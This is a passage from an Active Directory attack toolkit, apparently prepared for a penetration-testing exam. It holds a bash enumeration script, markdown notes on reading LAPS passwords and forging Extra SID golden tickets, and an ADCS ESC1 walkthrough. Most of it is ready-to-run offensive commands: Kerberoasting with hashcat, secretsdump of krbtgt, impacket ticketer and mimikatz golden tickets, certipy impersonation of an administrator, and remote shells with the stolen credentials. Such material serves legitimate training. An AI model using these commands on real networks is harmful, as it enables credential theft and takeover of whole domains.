    esac
done

# ---------- Parameter verification ----------
if [ -z "$DC" ] || [ -z "$DOMAIN" ]; then
    err "Missing required parameters: -s <DC host> and -D <domain FQDN> must be provided (example: -s DC01.corp.local -D corp.local)"
    usage
fi
if [ -n "$USER" ] && [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
    err "If -u $USER is given, you must give -p PASS or -H NTHASH"
    usage
fi
case "$MODE" in
    all|base|users|computers|groups|spn|delegation|laps|trust|sid|nmap|netexec|bloodhound) ;;
    *) err "Unknown -m mode: ${MODE} (see listing with -h)"; exit 1;;
esac

# BaseDN derivation: corp.local -> DC=corp,DC=local
if [ -z "$BASEDN" ]; then
    _IFS="$IFS"; IFS='.'; read -r -a _segs <<< "$DOMAIN"; IFS="$_IFS"
    _acc=""
    for seg in "${_segs[@]}"; do
        [ -z "$seg" ] && continue
        if [ -z "$_acc" ]; then _acc="DC=$seg"; else _acc="$_acc,DC=$seg"; fi
    done
    BASEDN="$_acc"
fi
# NetBIOS derivation: corp.local -> CORP
if [ -z "$NETBIOS" ]; then
    NETBIOS="$(printf '%s' "${DOMAIN%%.*}" | tr '[:lower:]' '[:upper:]')"
fi
BIND_DN="$NETBIOS\\$USER"
LDAP_URI="ldap://$DC"

mkdir -p "$OUTDIR" 2>/dev/null || err "Unable to create product directory ${OUTDIR} (does not affect print-only mode)"

info "Target DC: $DC"
info "Domain: $DOMAIN (BaseDN=$BASEDN, NetBIOS=$NETBIOS)"
if [ -n "$USER" ]; then info "Bind identity: $BIND_DN"; else info "Bind identity: anonymous (-x, most domains will reject it, only for detection)"; fi
[ "$DRY" = "1" ] && info "DRY RUN: only print commands"

# ---------- Universal actuator ----------
# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# run_cmd <Description> <Command...>: Print first, then execute if it is not dry; give a readable error when the command does not exist
run_cmd() {
    local desc="$1"; shift
    head_ "$desc"
    printable "$@"
    if [ "$DRY" = "1" ]; then return 0; fi
    if ! have "$1"; then
        err "Missing command on this machine: $1 (Kali: sudo apt install -y ldap-utils nmap impacket-scripts, or pipx install corresponding tool)"
        return 0
    fi
    "$@" 2>&1 || err "The command returns non-zero (this will happen if LDAP rejects anonymity/credential error/network failure), please check the above output."
    return 0
}

# ldap_search <filter> <attribute list (space separated)>
ldap_search() {
    local filter="$1" attrs="$2"
    if [ -n "$USER" ]; then
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -D "$BIND_DN" -w "$PASS" -b "$BASEDN" "$filter" $attrs
    else
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -b "$BASEDN" "$filter" $attrs
    fi
}

# ---------- Implementation of each mode ----------
mode_base() {
    ldap_search "(objectClass=*)" "namingContexts"
    run_cmd "nmap ldap script (can be run anonymously, check the domain information and whether anonymous binding is allowed)" \
        nmap -n -sV --script "ldap* and not brute" -p 389 "$DC"
}

mode_users() {
    ldap_search "(&(objectClass=user)(objectCategory=person))" \
        "sAMAccountName userPrincipalName description pwdLastSet lastLogon memberOf adminCount"
    echo
    info "Just want to see the user name: ldapsearch ... '(&(objectClass=user)(objectCategory=person))' sAMAccountName | grep sAMAccountName:"
    info "Grab AS-REP Roasting candidates (no pre-authentication required, UAC 4194304):"
    printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "%s" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName\n' \
        "$LDAP_URI" "$BIND_DN" "$BASEDN"
}

mode_computers() {
    ldap_search "(objectClass=computer)" \
        "sAMAccountName dnsHostName operatingSystem operatingSystemVersion lastLogon pwdLastSet"
}

mode_groups() {
    ldap_search "(objectClass=group)" "sAMAccountName member memberOf adminCount"
    echo
    info "Members of privileged groups (according to well-known RID), use SID to check directly for more stability:"
    for rid in 512 519 518 544; do
        printf 'ldapsearch -x -H %s -D "%s" -w PASS -b "CN=Users,%s" "(objectSid=<domain SID-%s>)" sAMAccountName member\n' \
            "$LDAP_URI" "$BIND_DN" "$BASEDN" "$rid"
    done
    info "(For groups not found in CN=Users, use -b \ instead."$BASEDN\"Full directory search (objectSID=...))"
}

mode_spn() {
    ldap_search "(&(servicePrincipalName=*)(!(objectClass=computer)))" \
        "sAMAccountName servicePrincipalName memberOf adminCount pwdLastSet"
    echo
    info "Kerberoast (requires plaintext or NTHASH, produces hashcat -m 13100 breakable ticket):"
    printf '  impacket-GetUserSPNs -dc-ip %s -outputfile %s/spn.txt %s/%s:PASS\n' \
        "$DC" "$OUTDIR" "$NETBIOS" "$USER"
    printf '  hashcat -m 13100 %s/spn.txt /usr/share/wordlists/rockyou.txt\n' "$OUTDIR"
}

mode_delegation() {
    ldap_search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
        "sAMAccountName dnsHostName"            # Unconstrained delegation TRUSTED_FOR_DELEGATION
    ldap_search "(msDS-AllowedToDelegateTo=*)" \
        "sAMAccountName msDS-AllowedToDelegateTo"   # constrained delegation
    ldap_search "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
        "sAMAccountName dnsHostName"                 # Resource-based constrained delegation (has been written about）
    echo
    info "Determination description: Unconstrained = UAC contains 524288; Constrained = msDS-AllowedToDelegateTo on the account has a value;"
    info "The target of RBCD is written on msDS-AllowedToActOnBehalfOfOtherIdentity of the "target computer"."
}

mode_laps() {
    info "Search both versions of LAPS at once (the output is empty when the attribute does not exist, and the deployment version is judged based on this):"
    ldap_search "(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
        "sAMAccountName dnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-PasswordExpirationTime msLAPS-EncryptedPassword"
    echo
    info "legacy LAPS plaintext query (AdmPwd): -b \"$BASEDN\" \"(ms-Mcs-AdmPwd=*)\" dnshostname ms-Mcs-AdmPwd"
    info "Windows LAPS plain text mode: Change the above properties to msLAPS-Password / msLAPS-PasswordExpirationTime"
    info "If Windows LAPS only has msLAPS-EncryptedPassword (DPAPI encryption), pure LDAP cannot decipher the plaintext."
    info "Requires target machine Get-LapsADPassword or DC side LAPS module - see m12-laps-and-trust-notes.md for details"
}

# Trust attribute decoding table (for scene 53 determination)
print_trust_legend() {
    cat <<'EOF'

--- Judgment table (check the numbers above）---------------------------------------
trustDirection: 0=Disable  1=inbound(The other party can authenticate to this domain)  2=outbound(This domain can authenticate to the other party)  3=Two-way
trustType     : 1=Downlevel(NoAD)  2=Uplevel(AD)  3=MIT(Kerberos v5)  4=DCE
trustAttributes key bit：
  0x00000020 (32)  WITHIN_FOREST  -> Rinnai(father and son)trust，SID Filtering does not take effect by default，Extra SID feasible
  0x00000008 (8)   FOREST_TRANSITIVE -> Trust in the woods
  0x00000040 (64)  FOREST_TRANSITIVE cross-forest position
  0x00000400 (1024) TREAT_AS_EXTERNAL / 0x00000004 QUARANTINED -> SID Filter by external processing
Judgment conclusion：
  WITHIN_FOREST(0x20) + Outbound or bidirectional(2/3) -> scene 53 of Extra SID Golden ticket route established
  external/forest trust or QUARANTINED        -> SID filtering Enabled by default，Extra SID Invalid, change the path
------------------------------------------------------------------------
EOF
}

mode_trust() {
    ldap_search "(objectClass=trustedDomain)" \
        "cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier"
    print_trust_legend
    echo
    info "Equivalent on Windows side (executed on subdomain host): nltest /domain_trusts /all_trusts"
    info "netexec side: netexec ldap $DC -u $USER -p 'PASS' -M enum_trusts"
    info "For the command to make Extra SID golden tickets after getting the subdomain krbtgt, see m12-laps-and-trust-notes.md"
}

# objectSid(base64) -> S-1-5-21-... (decode when python3 is available, otherwise give base64 with alternative command)
decode_sid_b64() {
    local b64="$1"
    if [ -n "$PYBIN" ]; then
        "$PYBIN" - "$b64" <<'PYEOF'
import base64, sys, struct
raw = base64.b64decode(sys.argv[1].strip())
rev, sub = raw[0], raw[1]
# Identity part big endian 6 bytes, sub-organization part 4 bytes little endian each
ident = struct.unpack('>Q', b'\x00\x00' + raw[2:8])[0]
out = ["S-%d-%d" % (rev, ident)]
for i in range(sub):
    off = 8 + i * 4
    out.append(str(struct.unpack('<I', raw[off:off + 4])[0]))
print('-'.join(out))
PYEOF
    else
        echo "(Not available in python3, objectSid(base64)=${b64}; use impacket-lookupsid to get SID instead)"
    fi
}

mode_sid() {
    if [ -n "$USER" ] && have impacket-lookupsid; then
        run_cmd "Domain SID (lookupsid, the most stable)" impacket-lookupsid "$NETBIOS/$USER:$PASS@$DC" 2
    else
        info "impacket-lookupsid is unavailable or has no credentials. Return to LDAP to read objectSid and then decode:"
        local b64
        if [ -n "$USER" ]; then
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -D "$BIND_DN" -w "$PASS" \
                   -b "$BASEDN" "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        else
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -b "$BASEDN" \
                   "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        fi
        printf 'ldapsearch ... "(objectClass=domainDNS)" objectSid\n'
        if [ -n "$b64" ]; then
            printf 'Domain SID: %s\n' "$(decode_sid_b64 "$b64")"
            info "Scenario 53 does -extra-sid with its Enterprise Admins SID (domain SID + -519)"
        else
            err "ObjectSid not retrieved: Anonymous rejected (add -u/-p) or DC is unreachable"
        fi
    fi
}

mode_nmap() {
    run_cmd "Complete set of nmap LDAP scripts" nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 "$DC"
}

mode_netexec() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER -H $NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "Netexec mode requires -u/-p or -u/-H (NTHASH Only netexec/bloodhound mode eats it)"
        return 0
    fi
    run_cmd "netexec ldap (domain information + common modules)" netexec ldap "$DC" $creds \
        -M enum_trusts -M laps
    run_cmd "netexec smb (share/sign/session)" netexec smb "$DC" $creds --shares
    run_cmd "netexec winrm (whether it can be executed remotely)" netexec winrm "$DC" $creds
    info "The module name changes with the version: netexec ldap -L lists available modules, then select enum_trusts / laps / adcs"
}

mode_bloodhound() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER --hashes 00000000000000000000000000000000:$NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "bloodhound mode requires -u/-p or -u/-H"
        return 0
    fi
    run_cmd "bloodhound-python full collection (output zip in ${OUTDIR})" \
        bloodhound-python -c ALL $creds -d "$DOMAIN" -dc "$DC" -ns "$DC" --dns-tcp
    info "After collecting, copy $OUTDIR/*.zip back to the local machine and import it into BloodHound: sudo neo4j start && bloodhound"
    info "When crossing network segments (using socks), add proxychains before the command and keep --dns-tcp"
}

case "$MODE" in
    all)
        mode_base; mode_users; mode_computers; mode_groups
        mode_spn; mode_delegation; mode_laps; mode_trust; mode_sid
        ;;
    base)       mode_base ;;
    users)      mode_users ;;
    computers)  mode_computers ;;
    groups)     mode_groups ;;
    spn)        mode_spn ;;
    delegation) mode_delegation ;;
    laps)       mode_laps ;;
    trust)      mode_trust ;;
    sid)        mode_sid ;;
    nmap)       mode_nmap ;;
    netexec)    mode_netexec ;;
    bloodhound) mode_bloodhound ;;
esac

printf '\n[*] Completion mode: %s (product directory %s)\n' "$MODE" "$OUTDIR"
info "Next: LAPS hit and see scenario 49; Delegation/RBCD hit and see scenario 51/52 (m12-delegation-attacks.ps1);"
info "Trust + SID hit see scenario 53 (Extra SID segment of m12-laps-and-trust-notes.md)."
````

#### `m12-laps-and-trust-notes.md` {#m12-laps-and-trust-notes-md}

````markdown
# m12 · LAPS reading, domain/forest trust enumeration, Extra SID and SID filtering command notes

<!--
use：LAPS（legacy AdmPwd and Windows LAPS Two reading methods), domain/Forest trust enumeration and determination、
      Extra SID / SID history injection、SID filtering Command quick check of precautions (pure notes, non-executable scripts)）。
scene：M12 scene 49（read LAPS）、53（subdomain → Lin Gen: Trust Judgment + Extra SID）。
rely：Linux side ldapsearch（ldap-utils）/ netexec / impacket（ticketer、secretsdump）/
      bloodhound-python；Windows side ADSI（The system comes with）、nltest（The system comes with）、
      PowerView or AdmPwd.PS / LAPS PowerShell Module (need to be delivered or brought by yourself）。
Usage: Execute in order of sections; replace the placeholders in the command and then paste。Linux For side batch enumeration
      m12-ad-enum-linux.sh -m laps / -m trust，Windows Side use
      m12-ad-enum-windows.ps1 -Mode LAPS。
placeholder：DOMAIN=domain FQDN  TARGET=DC/Host  USER/PASS/NTHASH=Credentials  LHOST=attack aircraft IP
      ——In the command of this article corp.local / child.corp.local They are all indicative domain names, replaced by the real values ​​​​of the exam environment.。
Test state: command shape press cheat sheet "AD Enumeration / AD Attacking" Compiled with common configurations of the target environment，
      Not in real multi-domain/Actual measurement of multi-forest environment step by step；SID and trust attributes are subject to the actual return value of the target。
-->

> one sentence principle：**Decide first before taking action**。LAPS You need to distinguish the version first（legacy `ms-Mcs-AdmPwd*` vs Windows LAPS
>
> `msLAPS-*`）；Cross-domain trust attributes must be determined first (whether `WITHIN_FOREST`、Is the direction available?），
>
> Change the route when the judgment is not established. Don't waste time on impossible routes.。
>
> placeholder：`DOMAIN` `TARGET` `USER` `PASS` `NTHASH` `LHOST`

---

## 1. LAPS version determination (30 seconds)

```bash
# Linux: Check four attributes at once to see which one exists
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword

# Only look at "installed or not" (the expiration time attribute is readable by domain users by default, which is the best existence criterion)
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnshostname
```

| Results seen | meaning |
|---|---|
| have `ms-Mcs-AdmPwd` value | legacy LAPS，clear text readable → Take it directly for remote execution |
| only `ms-Mcs-AdmPwdExpirationTime` No password | legacy LAPS Deployed but current identity**No read permission** |
| have `msLAPS-Password` | Windows LAPS Plain text mode, can be read directly |
| only `msLAPS-EncryptedPassword` | Windows LAPS encryption mode（DPAPI），pure LDAP Can't get the clear text |
| Nothing found | Not deployed LAPS，or NetBIOS/BaseDN Wrong writing |

---

## 2. legacy LAPS (`ms-Mcs-AdmPwd`) reading

### Linux side

```bash
# Single unit
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(&(objectClass=computer)(sAMAccountName=WS02$))" \
  dnshostname ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
# Scan the entire domain (fastest when you have read permission)
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" dnshostname ms-Mcs-AdmPwd

# netexec (when there is a corresponding module)
netexec ldap TARGET -u USER -p 'PASS' -M laps
netexec ldap TARGET -u USER -H NTHASH -M laps
```

### Windows side (no RSAT / no PowerView, pure ADSI)

```powershell
# Global: machines with password values
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").FindAll() |
  ForEach-Object { $_.Properties.dnshostname; $_.Properties.'ms-mcs-admpwd' }

# Single unit
([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=WS02$))").FindOne().Properties.'ms-mcs-admpwd'

# Only exists (readable by any domain user)
([adsisearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))").FindAll().Count
```

### Windows side (with PowerView / AdmPwd.PS)

```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity WS02 -Properties ms-Mcs-AdmPwd
Get-DomainComputer | Select-Object dnshostname,'ms-mcs-admpwd' | Where-Object { $_.'ms-mcs-admpwd' }

# legacy LAPS official module
Import-Module AdmPwd.PS
Get-AdmPwdPassword -ComputerName WS02
```

### Whether the legacy LAPS client is installed locally (used to determine the version)

```powershell
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
```

---

## 3. Windows LAPS (`msLAPS-*`) reading

```bash
# Linux: clear text mode
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(msLAPS-Password=*)" dnshostname msLAPS-Password msLAPS-PasswordExpirationTime
```

```powershell
# Windows LAPS plain text mode (PowerShell module)
Get-LapsADPassword -Identity WS02 -AsPlainText

# Encryption mode (msLAPS-EncryptedPassword, DPAPI protected):
#   Pure LDAP/unauthorized sessions cannot decrypt plaintext, require context that can be decrypted on the target machine
Get-LapsADPassword -Identity WS02 -AsPlainText          # Still preferred in privileged sessions
#   Confirm policy in registry (Windows 11/Server 2022+)
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Services\AdmPwd
```

**Don’t be stubborn when you can’t get the plaintext in encryption mode**, three alternatives:
1. Replace and still use legacy LAPS machines (often mixed in the same domain)）；
2. Changed it `msLAPS-Password` plaintext policy machine；
3. Elevate the privileges to an identity that can read the attribute first, and then come back to read it.。

---

## 4. Who has permission to read LAPS (readability check)

```powershell
# PowerView: Find principal with ReadProperty for ms-Mcs-AdmPwd
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } |
  ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier) -PassThru } |
  Select-Object IdentityName, ObjectDN
```

```bash
# Linux side comparison: first confirm who "I" is and which groups I am in
netexec ldap TARGET -u USER -p 'PASS' -M laps             # Directly enter the password when you have permission
bloodhound-python -c ACL -u USER -p 'PASS' -d DOMAIN -dc TARGET -ns TARGET --dns-tcp
# To see the target object ACL, use m12-ad-enum-windows.ps1 -Mode ACL
```

- Property exists but cannot be read → ACL It's a problem, not a tool problem；
- There is no value in the entire domain → Not deployed or the reset cycle has not yet arrived。

---

## 5. Landing after getting the LAPS password

```bash
# 445 on: SMB/WMI series (LAPS manages the local Administrator of the target machine)
impacket-wmiexec DOMAIN/Administrator@TARGET -p 'PASS'
impacket-psexec  DOMAIN/Administrator@TARGET -p 'PASS'
# Only open 5985: WinRM
evil-winrm -i TARGET -u Administrator -p 'PASS'
# When there is a hash
impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTHASH
```

- **LAPS Passwords are differentiated by machine**：WS02 Can't enter the password WS03；Make sure it is the same one before using it。
- Neither agreement is opened → This password is currently useless, please go back to enumeration to find another entrance.。

---

## 6. Domain/Forest Trust Enumeration

### Windows

```cmd
nltest /domain_trusts /all_trusts
nltest /trusted_domains
nltest /dclist:DOMAIN
```

```powershell
# When RSAT is available
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
(Get-ADForest).Domains
# No RSAT (ADSI)
([adsisearcher]"(objectClass=trustedDomain)").FindAll() |
  ForEach-Object { $_.Properties.cn; $_.Properties.trustpartner;
                  $_.Properties.trustattributes; $_.Properties.trustdirection }
```

### Linux

```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=trustedDomain)" \
  cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier

netexec ldap TARGET -u USER -p 'PASS' -M enum_trusts
./m12-ad-enum-linux.sh -m trust -s TARGET -D corp.local -u USER -p 'PASS'
```

---

## 7. Trust determination table (core of scenario 53)

**trustDirection**: `0`=disabled · `1`=inbound (the other party can authenticate to this domain) · `2`=outbound (this domain can authenticate to the other party) · `3`=bidirectional

**trustType**: `1`=Downlevel(non-AD) · `2`=Uplevel(AD) · `3`=MIT(Kerberos v5) · `4`=DCE

**trustAttributes key**

| value | constant | meaning / right Extra SID influence |
|---|---|---|
| `0x00000020` (32) | `WITHIN_FOREST` | **Linnei (Father and Son) Trust**，SID Filtering does not take effect by default → Extra SID feasible |
| `0x00000008` (8) | `FOREST_TRANSITIVE` | Lin trust, cross forest |
| `0x00000004` (4) | `QUARANTINED` | isolation，SID Filter by external processing → Extra SID invalid |
| `0x00000400` (1024) | `TREAT_AS_EXTERNAL` | Handle as external trust → SID Filter on |
| `0x00000040` (64) | `CROSS_ORGANIZATION` | Across organizations, handled externally |

**Judgment conclusion**

- `WITHIN_FOREST(0x20)` + Outbound or bidirectional（`2` / `3`）→ Extra SID Golden ticket route established；
- external/forest trust, or belt `QUARANTINED` / `TREAT_AS_EXTERNAL` → SID filtering Enabled by default，**Extra SID invalid**，Change path (cross-domain ACL、LAPS、delegate、ADCS reassess）；
- The direction is"root→child"one-way inbound → The subdomain cannot be authenticated to the root, and the mutual trust ticket is with Extra SID No way。

---

## 8. Extra SID Golden Ticket (Subdomain → Lingen)

prefix：① The above is determined to be trustworthy within the forest and the direction is available.；② get**subdomain krbtgt of NTLM**；③ subdomain SID and**root domain SID**（root domain SID + `-519` = Enterprise Admins）。

```bash
# ① Get krbtgt on the subdomain DC (when there is already a subdomain DA)
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:'PASS'@TARGET

# ② Get the root domain SID (in the root domain context)
impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2        # fields in output SID
# Or use ldapsearch "(objectClass=domainDNS)" objectSid (see m12-ad-enum-linux.sh -m sid)

# ③ Create a golden ticket with Extra SID
impacket-ticketer -nthash <subdomainkrbtgtofNT> -domain child.corp.local \
  -domain-sid <subdomainSID> -extra-sid '<Root domain SID>-519' Administrator

# ④ Use the ticket to create the root domain
export KRB5CCNAME=Administrator.ccache
klist -e
impacket-secretsdump -k -no-pass <rootDC FQDN>
```

**Windows side equivalent**

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<subdomainSID> /krbtgt:<subdomainkrbtgt NT> /sids:<root domainSID>-519 /ptt
```
```powershell
.\Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<subdomainSID> /krbtgt:<subdomainkrbtgt NT> /sids:<root domainSID>-519 /ptt
```

- `-extra-sid` can only be**root domain SID of RID suffix**Common values：`-519`(Enterprise Admins)、`-512`(Domain Admins)、`-518`(Schema Admins)。
- Frequent errors: Root domain SID Wrong copy / Forgot `-519` suffix / `/etc/hosts` Reagan DC of FQDN Unable to parse。

---

## 9. Notes on SID history injection and SID filtering

**Injection** (Insert the foreign domain SID into the ExtraSids / SIDHistory of the PAC):

```bash
impacket-ticketer -nthash NTHASH -domain DOMAIN -domain-sid <domainSID> -extra-sid '<target domain SID>-519' USER
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domainSID> /krbtgt:NTHASH /sids:<TargetSID>-519 /ptt
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domainSID> /krbtgt:NTHASH /sids:<TargetSID> /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

**SID filtering (isolation) points**

- Purpose: when crossing trusts，KDC meeting**peel off**Not belonging to this forest SID（ExtraSids / SIDHistory），So injected Enterprise Admins SID will be discarded when filtering is enabled。
- Default behavior: Rinnai and Son/Roots of trust**No filtering**；External trust and forest trust**Default filtering**；`QUARANTINED` / `TREAT_AS_EXTERNAL` Bits are forced to be handled externally。
- Available to domain administrators `netdom trust DOMAIN /domain:OTHER /quarantine:no` Turn off filtering (requires EA Permissions are basically not expected in the exam, and do not change the target environment for this purpose.）。
- Judgment method returns to Chapter 7 Section: Look `trustAttributes`，Don't rely on"Try it and see if it works"。
- Even if filtering is turned off, it still depends on whether the target is enabled `EnableSIDHistory` Related strategies and PAC Verification; if the expected permissions cannot be obtained, first `klist` / `whoami /groups` confirm SID Whether the token is really entered?。

**Verify that Extra SID is valid**

```bash
klist -e                                     # Whether the ticket is generated and whether the subject is correct
impacket-secretsdump -k -no-pass <rootDC FQDN> # able dump out of root domain krbtgt = Take effect
```
```cmd
whoami /groups                               # injection /ptt You should be able to see it later Enterprise Admins of SID
```

---

## 10. Quick check on failed branches

| Phenomenon | judge | deal with |
|---|---|---|
| LAPS All attributes are empty | Not deployed / No read permission | Change machine enumeration; or elevate privileges first and then read; or transfer RBCD/delegate/ADCS |
| only encrypted `msLAPS-EncryptedPassword` | Windows LAPS encryption mode | try to find legacy machine or plaintext policy machine; don’t fight for decryption |
| The password is correct but I can’t get in | The password belongs to another machine | Confirm the machine name and change the password of the corresponding machine |
| Only open 5985 | SMB Doesn't make sense | `evil-winrm`；If both agreements are closed, this article will be abandoned. |
| trust is external/forest | SID filtering open | Extra SID Invalid, switch to cross-domain ACL or other entrance |
| One way and opposite direction | Subdomain cannot authenticate to root | Can only rely on other paths within the root domain |
| Golden ticket authentication failed（TGS rejected） | SID/suffix/FQDN Wrong writing | Check `-extra-sid` and `/etc/hosts` the root of DC parse |
| no subdomain krbtgt | Only control the non DC High authority | First go horizontally in the subdomain to DC Again `secretsdump` |

---

## 11. Examination Notes / OPSEC

- LAPS The query will be written LDAP Audit log, expected enumeration behavior；**don't want**to the whole domain dump Then randomly try the passwords one by one, and only take the machines needed for the scenario.。
- Do not leave the password in a long command in clear text shell History (using environment variables or script parameters）。
- golden ticket / Extra SID The most sensitive operations in the domain: only performed after the trust determination is established, and cleaned up after completion `ccache`；`ticketer` Only runs locally on the attack machine and does not deliver files to the target.。
- `/etc/hosts` Must also be able to resolve subdomains DC with roots DC of FQDN（Kerberos Not accepted IP），use
  `m12-kerberos-tickets-linux.sh -m hosts` Generate template。
- time offset >5 Minutes will make everything Kerberos The operation failed. Please calibrate the time first and then troubleshoot.。
````

## Scenario 54: Low-privilege domain users can apply for incorrectly configured certificate templates (ESC1)

**Situation**: ADCS is deployed in the domain; a published template meets the ESC1 conditions, and the current low-privilege user **has the right to apply**. Goal: Use the certificate to obtain administrator status.

**ESC1 Judgment Conditions (all four are met at the same time)**: ① The template is turned on** The applicant provides SAN** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, that is, you can fill in `-upn`); ② The template EKU contains **Client Authentication** (`Client Authentication`, or use Any Purpose's "any purpose" template, which is often encountered in the exam); ③ The template allows low-privilege users/groups to register** (enroll) Permissions); ④ Template **not set** CA certificate manager approval (`CA Manager Approval` closed, otherwise the application will be suspended).

**Assumptions**: `certipy` (Kali: `certipy-ad`) is available; the attack machine can parse and access the CA host (LDAP/DCERPC, if necessary `/etc/hosts`); the FQDN of the DC and CA are known.

**Prepare (attacker)**: `certipy find` First do the full template enumeration and mark the available items (one enumeration will get the CA name/template list/applicants at the same time to avoid blind testing).

**Procedure**：
```bash
# ① Enumeration: List -vulnerable templates and registrable subjects
certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
# ② Application: Impersonate administrator (SAN fill in its UPN)
certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
  -template 'VulnTemplate' -upn administrator@corp.local -dc-ip DC01.corp.local -out admin
# ③ Exchange certificate for NTLM hash → DCSync
certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**Scripts used**: `m12-adcs-esc1-esc8.sh` (enumerate/req/auth one-click encapsulation + parameter template).

**Validation**: `certipy auth` successfully outputs the NTLM hash; `secretsdump` can read `krbtgt` and reaches domain management.

**Failure branches and alternatives**：
- `req` newspaper 0x80094012 / Certificate policy mismatch → template EKU Does not contain client authentication or template is rejected, replace `-template` candidate (using `certipy find` instead of just looking at the full list of vulnerable mark）。
- `req` Report permission/rejected → The current user does not have registration rights for this template；`-upn` The user does not exist or UPN No match; check one by one ESC1 four conditions。
- The application was successful but `auth` fail → Certificate subject/Issuance time issue, re- `req` use `-out` Cover; or replace `certipy auth -username administrator -domain corp.local` Explicitly specified。
- CA name/Host resolution failed → `find` Take from output `CA Name` and DNS hostname，`/etc/hosts` Point to reality CA IP；`-target` Parameters can be directly pointed to CA。
- None available ESC1 template → Don't try hard, jump to ESC8（scene 55）or other entrance。

**Exam / OPSEC notes**: `certipy find -vulnerable` The output will list the global question templates, only those required by the scenario; applying for a certificate will be written to the CA log, pretending to be the object to select the scenario target (administrator/machine account), do not apply for irrelevant certificates randomly for "testing".

---

#### `m12-adcs-esc1-esc8.sh` {#m12-adcs-esc1-esc8-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: Encapsulation of the two main lines of ADCS - ESC1 (the applicant can provide a template for the SAN, and directly impersonate the administrator with low permissions)
#       With ESC8 (NTLM relay to ADCS HTTP registration endpoint for certificate exchange), plus template enumeration, PFX→ccache
#       Flow and dependency self-checking. Each mode prints the complete command first, and then adds -x before it is actually executed.
# Scenario: M12 Scenario 54 (low-authority domain users apply for incorrectly configured certificate templates) and Scenario 55 (CA exists and can relay
#       HTTP registration portal).
# Dependencies: certipy (Kali 2023+ package name certipy-ad, pipx install certipy-ad; the old version is called certipy,
#       The script automatically detects both); impacket(impacket-ntlmrelayx/impacket-petitpotam/
#       impacket-secretsdump, sudo apt install -y impacket-scripts); openssl (PFX teardown).
# Use: ./m12-adcs-esc1-esc8.sh -m deps
